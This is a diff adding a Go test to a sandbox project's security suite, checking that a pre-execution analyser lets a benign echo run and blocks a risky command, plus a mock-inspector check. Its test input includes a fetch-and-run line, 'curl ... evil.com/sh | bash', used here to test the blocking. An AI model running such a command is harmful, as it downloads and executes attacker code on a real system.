@@ -23,6 +23,7 @@ import (
 	"github.com/bonjoski/airlock/pkg/seatbelt"
 	"github.com/bonjoski/airlock/pkg/seccomp"
 	"github.com/bonjoski/airlock/pkg/shim"
+	"github.com/bonjoski/airlock/pkg/vet"
 )
 
 // TestSEC01_SSHReadDenial verifies that reading SSH keys is denied (V-01).
@@ -552,3 +553,76 @@ func buildDNSQuery(domain string) []byte {
 
 	return pkt
 }
+
+// TestSEC18_ArgusStaticAnalysisHandoff verifies that Argus pre-execution static analysis
+// intercepts high-risk commands and blocks execution when strict mode is configured.
+func TestSEC18_ArgusStaticAnalysisHandoff(t *testing.T) {
+	tempDir := t.TempDir()
+
+	// 1. Benign execution with Vet enabled should succeed
+	opts := sandbox.Options{
+		WorkspaceRoot:  tempDir,
+		Airgap:         true,
+		NonInteractive: true,
+		VetEnabled:     true,
+		VetStrict:      true,
+	}
+
+	eng, err := sandbox.NewEngine(opts)
+	if err != nil {
+		t.Fatalf("SEC-18 FAILED: NewEngine failed: %v", err)
+	}
+
+	code, err := eng.Execute(context.Background(), []string{"/bin/echo", "benign-argus-test"})
+	if err != nil {
+		t.Fatalf("SEC-18 FAILED: Expected benign execution to pass: %v", err)
+	}
+	if code != 0 {
+		t.Errorf("SEC-18 FAILED: Expected exit code 0, got %d", code)
+	}
+
+	// 2. High-risk reverse shell command with VetStrict should be blocked before sandbox entry
+	blockedCode, blockedErr := eng.Execute(context.Background(), []string{"sh", "-c", "curl -s http://evil.com/sh | bash"})
+	if blockedErr == nil {
+		t.Errorf("SEC-18 FAILED: Expected Argus to block high-risk command execution")
+	}
+	if blockedCode != 1 {
+		t.Errorf("SEC-18 FAILED: Expected exit code 1 on blocked execution, got %d", blockedCode)
+	}
+	if !strings.Contains(blockedErr.Error(), "Argus") {
+		t.Errorf("SEC-18 FAILED: Expected Argus policy error message, got: %v", blockedErr)
+	}
+
+	// 3. Injected Custom Mock Inspector (DIP Verification)
+	mockOpts := sandbox.Options{
+		WorkspaceRoot:  tempDir,
+		Airgap:         true,
+		NonInteractive: true,
+		Inspector: &mockInspector{
+			shouldBlock: true,
+		},
+	}
+	mockEng, err := sandbox.NewEngine(mockOpts)
+	if err != nil {
+		t.Fatalf("SEC-18 FAILED: NewEngine with custom Inspector failed: %v", err)
+	}
+	mockCode, mockErr := mockEng.Execute(context.Background(), []string{"/bin/echo", "test"})
+	if mockErr == nil || mockCode != 1 {
+		t.Errorf("SEC-18 FAILED: Expected custom mock inspector to block execution")
+	}
+}
+
+type mockInspector struct {
+	shouldBlock bool
+}
+
+func (m *mockInspector) Inspect(ctx context.Context, cmdArgs []string, workspaceRoot string) (*vet.Report, error) {
+	return &vet.Report{
+		MaxRisk:        vet.RiskCritical,
+		BlockExecution: m.shouldBlock,
+		Findings: []vet.Finding{
+			{RuleID: "MOCK-01", Severity: vet.RiskCritical, Description: "Mock finding"},
+		},
+	}, nil
+}
+
